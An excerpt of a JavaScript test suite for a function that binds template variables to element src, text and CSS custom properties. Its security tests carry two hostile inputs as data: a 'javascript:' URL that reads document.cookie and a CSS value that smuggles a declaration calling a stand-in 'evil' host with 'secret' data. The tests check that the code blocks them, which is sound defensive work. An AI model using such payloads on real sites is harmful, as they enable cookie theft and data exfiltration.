...
beforeEach(() => {
  win.__smashcut = { getVariables };
});

afterEach(() => {
  delete win.__scVariables;
  delete win.__scVariablesByComp;
  delete win.__smashcut;
...
describe("applyVariableBindings", () => {
  it("sets src from a string variable via data-var-src", () => {
    ...
    document.body.innerHTML = `
      <div data-sc-root data-composition-id="c1">
  ...
  it("render-time overrides win, and {url} image values resolve", () => {
    setDeclared([{ id: "hero", type: "image", label: "Hero", default: "default.jpg" }]);
    win.__scVariables = { hero: { url: "https://cdn/override.png" } };
    document.body.innerHTML = `
      <div data-sc-root><video data-var-src="hero" src="fallback.mp4"></video></div>`;
    applyVariableBindings(document);
  ...
  it("keeps the authored src when the variable resolves to nothing", () => {
    document.body.innerHTML = `<div data-sc-root><img data-var-src="ghost" src="keep.jpg" /></div>`;
    applyVariableBindings(document);
  ...
  it("sets text content from a scalar via data-var-text", () => {
    ...
    win.__scVariables = { title: "Overridden" };
    document.body.innerHTML = `<div data-sc-root><h1 data-var-text="title">Authored</h1></div>`;
    applyVariableBindings(document);
  ...
  it("applies scalar variables as --{id} custom props on the root", () => {
    ...
    win.__scVariables = { accent: "#ff0000" };
    document.body.innerHTML = `<div id="root" data-sc-root></div>`;
    applyVariableBindings(document);
  ...
  it("preserves element children when binding text on a container", () => {
    win.__scVariables = { title: "Replaced" };
    document.body.innerHTML = `
      <div data-sc-root>
  ...
  it("is idempotent across re-application (loader re-apply path)", () => {
    win.__scVariables = { title: "Once" };
    document.body.innerHTML = `<div data-sc-root><h1 data-var-text="title">t</h1></div>`;
    applyVariableBindings(document);
    applyVariableBindings(document);
  ...
  it("resolves sub-composition elements against their scoped values", () => {
    win.__scVariablesByComp = { sub: { label: "Scoped" } };
    win.__scVariables = { label: "TopLevel" };
    document.body.innerHTML = `
      <div data-sc-root data-composition-id="main">
  ...
  describe("security", () => {
    it("refuses data-var-src on a non-media tag (XSS sink)", () => {
      win.__scVariables = { evil: "javascript:alert(document.cookie)" };
      document.body.innerHTML = `<div data-sc-root><iframe id="f" data-var-src="evil"></iframe></div>`;
      applyVariableBindings(document);
    ...
    it("strips declaration-smuggling characters from a CSS custom property value", () => {
      ...
      win.__scVariables = { accent: "red; background: url(//evil?data=secret)" };
      document.body.innerHTML = `<div id="root" data-sc-root></div>`;
      applyVariableBindings(document);
